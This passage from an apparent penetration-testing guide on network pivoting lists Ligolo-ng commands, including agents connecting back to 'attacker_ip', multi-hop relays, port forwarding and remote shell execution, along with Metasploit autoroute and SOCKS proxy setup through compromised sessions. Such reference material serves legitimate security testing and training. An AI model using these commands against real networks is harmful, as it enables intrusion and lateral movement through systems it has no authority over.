</span><span class="token function" style="color:rgb(80, 250, 123)">ip</span><span class="token plain"> route </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.56.0/24 dev ligolo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Proxy server with custom TUN interface</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">sudo</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">ip</span><span class="token plain"> tuntap </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> dev tun_pivot mode tun</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">sudo</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">ip</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">link</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> tun_pivot up</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">sudo</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">ip</span><span class="token plain"> addr </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.255.1/24 dev tun_pivot</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start proxy with self-signed certificate</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./proxy </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-selfcert</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start proxy with custom certificate</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./proxy </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-certfile</span><span class="token plain"> server.crt </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-keyfile</span><span class="token plain"> server.key</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Proxy with custom listening address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./proxy </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-laddr</span><span class="token plain"> </span><span class="token number">0.0</span><span class="token plain">.0.0:11601 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-selfcert</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Agent connection establishment</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./agent </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-connect</span><span class="token plain"> attacker_ip:11601 -ignore-cert</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Agent with retry mechanism</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./agent </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-connect</span><span class="token plain"> attacker_ip:11601 -ignore-cert </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-retry</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Bind agent (listening mode)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./agent </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-listen</span><span class="token plain"> </span><span class="token number">0.0</span><span class="token plain">.0.0:11601 -ignore-cert</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Agent with custom socket timeout</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./agent </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-connect</span><span class="token plain"> attacker_ip:11601 -ignore-cert </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-timeout</span><span class="token plain"> 30s</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="42-session-management-and-network-configuration">4.2 Session Management and Network Configuration<a href="#42-session-management-and-network-configuration" class="hash-link" aria-label="Direct link to 4.2 Session Management and Network Configuration" title="Direct link to 4.2 Session Management and Network Configuration" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Ligolo-ng interactive commands</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># List all connected agents</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ligolo-ng ¬ª session</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Select specific agent session</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ligolo-ng ¬ª session </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Display agent network information</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agent ¬ª </span><span class="token function" style="color:rgb(80, 250, 123)">ifconfig</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start tunneling session</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agent ¬ª start</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Stop active tunnel</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agent ¬ª stop</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Add route to specific network</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agent ¬ª tunnel_add </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--tun</span><span class="token plain"> ligolo </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--route</span><span class="token plain"> </span><span class="token number">10.10</span><span class="token plain">.10.0/24</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Add multiple network routes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agent ¬ª tunnel_add </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--tun</span><span class="token plain"> ligolo </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--route</span><span class="token plain"> </span><span class="token number">172.16</span><span class="token plain">.0.0/16</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agent ¬ª tunnel_add </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--tun</span><span class="token plain"> ligolo </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--route</span><span class="token plain"> </span><span class="token number">10.0</span><span class="token plain">.0.0/8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Remove specific route</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agent ¬ª tunnel_del </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--tun</span><span class="token plain"> ligolo </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--route</span><span class="token plain"> </span><span class="token number">10.10</span><span class="token plain">.10.0/24</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="43-advanced-tunneling-features">4.3 Advanced Tunneling Features<a href="#43-advanced-tunneling-features" class="hash-link" aria-label="Direct link to 4.3 Advanced Tunneling Features" title="Direct link to 4.3 Advanced Tunneling Features" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Port forwarding through agent</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agent ¬ª listener_add </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--addr</span><span class="token plain"> </span><span class="token number">0.0</span><span class="token plain">.0.0:8000 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--to</span><span class="token plain"> </span><span class="token number">10.0</span><span class="token plain">.0.10:80 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--tcp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># UDP service forwarding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agent ¬ª listener_add </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--addr</span><span class="token plain"> </span><span class="token number">0.0</span><span class="token plain">.0.0:53 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--to</span><span class="token plain"> </span><span class="token number">10.0</span><span class="token plain">.0.53:53 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--udp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Reverse port forwarding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agent ¬ª listener_add </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--addr</span><span class="token plain"> </span><span class="token number">0.0</span><span class="token plain">.0.0:443 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--to</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.1.100:443 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--tcp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># List active listeners</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agent ¬ª listener_list</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Remove specific listener</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agent ¬ª listener_del </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--id</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Agent relay for multi-hop pivoting</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./agent </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-connect</span><span class="token plain"> first_pivot:11601 -ignore-cert </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-relay</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Agent with SOCKS5 proxy</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./agent </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-connect</span><span class="token plain"> attacker_ip:11601 -ignore-cert </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-socks5</span><span class="token plain"> </span><span class="token number">127.0</span><span class="token plain">.0.1:1080</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Command execution on agent host</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agent ¬ª shell </span><span class="token function" style="color:rgb(80, 250, 123)">whoami</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agent ¬ª shell </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;netstat -an | grep LISTEN&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agent ¬ª shell </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;ipconfig /all&quot;</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="5-metasploit-framework-comprehensive-pivoting-integration">5. Metasploit Framework: Comprehensive Pivoting Integration<a href="#5-metasploit-framework-comprehensive-pivoting-integration" class="hash-link" aria-label="Direct link to 5. Metasploit Framework: Comprehensive Pivoting Integration" title="Direct link to 5. Metasploit Framework: Comprehensive Pivoting Integration" translate="no">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>The following commands assume you have a running Metasploit Framework instance and Meterpreter payloads are properly established. Adjust network addresses, session IDs, and handler parameters to match your engagement.</p></div></div>
<p>The Metasploit Framework provides extensive pivoting capabilities through integrated session management, automated routing, and payload coordination.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="51-session-based-routing-configuration">5.1 Session-Based Routing Configuration<a href="#51-session-based-routing-configuration" class="hash-link" aria-label="Direct link to 5.1 Session-Based Routing Configuration" title="Direct link to 5.1 Session-Based Routing Configuration" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Manual route addition</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf </span><span class="token operator">&gt;</span><span class="token plain"> route </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> </span><span class="token number">10.10</span><span class="token plain">.10.0/24 </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Automated route discovery and configuration</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf </span><span class="token operator">&gt;</span><span class="token plain"> use post/multi/manage/autoroute</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf post</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">autoroute</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> </span><span class="token environment constant" style="color:rgb(189, 147, 249)">SESSION</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf post</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">autoroute</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> SUBNET </span><span class="token number">10.10</span><span class="token plain">.10.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf post</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">autoroute</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> NETMASK </span><span class="token number">255.255</span><span class="token plain">.255.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf post</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">autoroute</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> run</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Automatic network discovery</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter </span><span class="token operator">&gt;</span><span class="token plain"> run autoroute </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-auto</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Add specific subnet routes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter </span><span class="token operator">&gt;</span><span class="token plain"> run autoroute </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-s</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.1.0/24</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter </span><span class="token operator">&gt;</span><span class="token plain"> run autoroute </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-s</span><span class="token plain"> </span><span class="token number">172.16</span><span class="token plain">.0.0/16</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># View current routing table</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf </span><span class="token operator">&gt;</span><span class="token plain"> route print</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Delete specific route</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf </span><span class="token operator">&gt;</span><span class="token plain"> route delete </span><span class="token number">10.10</span><span class="token plain">.10.0/24 </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Flush all routes for session</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf </span><span class="token operator">&gt;</span><span class="token plain"> route flush </span><span class="token number">1</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="52-socks-proxy-implementation">5.2 SOCKS Proxy Implementation<a href="#52-socks-proxy-implementation" class="hash-link" aria-label="Direct link to 5.2 SOCKS Proxy Implementation" title="Direct link to 5.2 SOCKS Proxy Implementation" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Start SOCKS4 proxy</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf </span><span class="token operator">&gt;</span><span class="token plain"> use auxiliary/server/socks4a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf auxiliary</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">socks4a</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> SRVPORT </span><span class="token number">9050</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf auxiliary</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">socks4a</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> run </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-j</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start SOCKS5 proxy with authentication</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf </span><span class="token operator">&gt;</span><span class="token plain"> use auxiliary/server/socks_proxy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf auxiliary</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">socks_proxy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> SRVPORT </span><span class="token number">9050</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf auxiliary</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">socks_proxy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> VERSION </span><span class="token number">5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf auxiliary</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">socks_proxy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> USERNAME user</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf auxiliary</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">socks_proxy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> PASSWORD pass</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf auxiliary</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">socks_proxy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> run </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-j</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># SOCKS proxy with custom interface binding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf auxiliary</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">socks_proxy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> SRVHOST </span><span class="token number">127.0</span><span class="token plain">.0.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf auxiliary</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">socks_proxy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> run </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-j</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Stop SOCKS proxy</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">jobs</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-k</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">job_id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="53-port-forwarding-mechanisms">5.3 Port Forwarding Mechanisms<a href="#53-port-forwarding-mechanisms" class="hash-link" aria-label="Direct link to 5.3 Port Forwarding Mechanisms" title="Direct link to 5.3 Port Forwarding Mechanisms" translate="no">‚Äã</a></h3>
